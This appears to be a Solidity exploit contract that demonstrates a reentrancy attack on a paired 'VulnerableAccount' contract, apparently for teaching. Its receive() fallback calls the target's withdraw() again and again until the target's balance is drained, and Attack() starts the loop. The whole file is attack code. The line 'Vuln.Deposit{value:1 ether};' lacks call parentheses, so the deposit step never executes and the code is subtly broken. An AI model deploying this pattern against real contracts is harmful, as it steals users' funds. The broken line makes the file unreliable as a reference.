// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;
import "./VulnerableAccount.sol";

contract HackerAccount{

Vulnerablecontract public Vuln;
constructor (address contractaddress){
    Vuln=Vulnerablecontract(contractaddress);

}
   receive() external payable{
      if(address(Vuln).balance>1 ether){
           Vuln.withdraw();//we can external function by using external account object reference
      }
   }

   function Attack()public payable{
            require(msg.value>=1 ether);
            Vuln.Deposit{value:1 ether};

            Vuln.withdraw();

   }

   function getHackerBalance()public view returns(uint){
    return address(this).balance;
   }

}